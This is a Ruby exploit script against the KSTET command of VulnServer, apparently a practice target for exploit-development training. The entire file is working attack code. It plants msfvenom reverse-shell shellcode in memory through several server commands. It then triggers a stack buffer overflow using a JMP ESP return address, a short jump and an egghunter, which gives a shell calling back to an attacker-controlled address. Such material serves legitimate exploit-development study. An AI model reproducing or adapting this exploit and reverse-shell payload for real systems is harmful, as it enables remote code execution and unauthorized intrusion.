#! /usr/bin/env ruby
# VulnServer.exe KSTET Exploit
# 
# Usage ./kstet.rb <IP> <PORT>
#
require 'socket'

# Check arguments
if ARGV.length < 2
  puts "usage #{__FILE__} <target ip> <target port>"
  exit
end

# Create the socket arguments from ARGV
IP = ARGV[0]
PORT = ARGV[1]

# msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f ruby LHOST=192.168.10.176 LPORT=9998
#Payload size: 351 bytes

shellcode = "WOOPWOOP" +
"\xba\xc7\xa7\xc8\xfa\xdb\xdc\xd9\x74\x24\xf4\x5e\x31\xc9" +
"\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\x91\xa9\x2a\x0f\xe1" +
"\x5e\x28\xf0\x19\x9f\x4d\x78\xfc\xae\x4d\x1e\x75\x80\x7d" +
"\x54\xdb\x2d\xf5\x38\xcf\xa6\x7b\x95\xe0\x0f\x31\xc3\xcf" +
"\x90\x6a\x37\x4e\x13\x71\x64\xb0\x2a\xba\x79\xb1\x6b\xa7" +
"\x70\xe3\x24\xa3\x27\x13\x40\xf9\xfb\x98\x1a\xef\x7b\x7d" +
"\xea\x0e\xad\xd0\x60\x49\x6d\xd3\xa5\xe1\x24\xcb\xaa\xcc" +
"\xff\x60\x18\xba\x01\xa0\x50\x43\xad\x8d\x5c\xb6\xaf\xca" +
"\x5b\x29\xda\x22\x98\xd4\xdd\xf1\xe2\x02\x6b\xe1\x45\xc0" +
"\xcb\xcd\x74\x05\x8d\x86\x7b\xe2\xd9\xc0\x9f\xf5\x0e\x7b" +
"\x9b\x7e\xb1\xab\x2d\xc4\x96\x6f\x75\x9e\xb7\x36\xd3\x71" +
"\xc7\x28\xbc\x2e\x6d\x23\x51\x3a\x1c\x6e\x3e\x8f\x2d\x90" +
"\xbe\x87\x26\xe3\x8c\x08\x9d\x6b\xbd\xc1\x3b\x6c\xc2\xfb" +
"\xfc\xe2\x3d\x04\xfd\x2b\xfa\x50\xad\x43\x2b\xd9\x26\x93" +
"\xd4\x0c\xe8\xc3\x7a\xff\x49\xb3\x3a\xaf\x21\xd9\xb4\x90" +
"\x52\xe2\x1e\xb9\xf9\x19\xc9\x06\x55\x2b\xb9\xef\xa4\x2b" +
"\x9e\xe1\x21\xcd\x8a\xed\x67\x46\x23\x97\x2d\x1c\xd2\x58" +
"\xf8\x59\xd4\xd3\x0f\x9e\x9b\x13\x65\x8c\x4c\xd4\x30\xee" +
"\xdb\xeb\xee\x86\x80\x7e\x75\x56\xce\x62\x22\x01\x87\x55" +
"\x3b\xc7\x35\xcf\x95\xf5\xc7\x89\xde\xbd\x13\x6a\xe0\x3c" +
"\xd1\xd6\xc6\x2e\x2f\xd6\x42\x1a\xff\x81\x1c\xf4\xb9\x7b" +
"\xef\xae\x13\xd7\xb9\x26\xe5\x1b\x7a\x30\xea\x71\x0c\xdc" +
"\x5b\x2c\x49\xe3\x54\xb8\x5d\x9c\x88\x58\xa1\x77\x09\x68" +
"\xe8\xd5\x38\xe1\xb5\x8c\x78\x6c\x46\x7b\xbe\x89\xc5\x89" +
"\x3f\x6e\xd5\xf8\x3a\x2a\x51\x11\x37\x23\x34\x15\xe4\x44" +
"\x1d"

# Fill memory space with our shellcode 
# Exclude STATS, RTIME, LTIME, SRUN, TRUN  which truncates the shellcode!)
pre_cmds = [ 
  "HELP", "GMON", "GDOG", "HTER", "LTER", "KSTAN" 
]

# For each pre-cmd send our shellcode and hope it stays in memory
pre_cmds.each do |cmd|
  puts "[+] Creating connection for: #{cmd}"
  s = TCPSocket.new(IP, PORT)
  s.gets
  buffer = cmd + " " + shellcode
  puts "[+] Sending shellcode to memory using: #{cmd}"
  s.puts(buffer)
  s.close
end

puts "[+] Creating exploit trigger using KSTET command... "

# Define command for exploit
cmd = "KSTET"

# Define payload
ret = "\xaf\x11\x50\x62"      # 625011AF FFE4 JMP ESP
stage1 = "\xeb\xbe\x90\x90"   # JMP SHORT -0x40
stage2 =                      # egghunter WOOP WOOP
  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05" +
  "\x5a\x74\xef\xb8\x57\x4f\x4f\x50\x89\xd7\xaf\x75\xea\xaf" +
  "\x75\xe7\xff\xe7"

payload = " " + "\x90" * 10 + stage2 + "\x90" * 28  + ret + stage1

# Create a socket for the exploit
s = TCPSocket.new(IP, PORT) 

# Send the payload
begin
  s.gets
  puts "[+] Sending final payload.."
  s.puts(cmd + payload)
  s.gets
  puts "[-] Failed to crash the target"
  s.close
rescue Errno::ECONNRESET
  puts "[+] Crash!!"
end

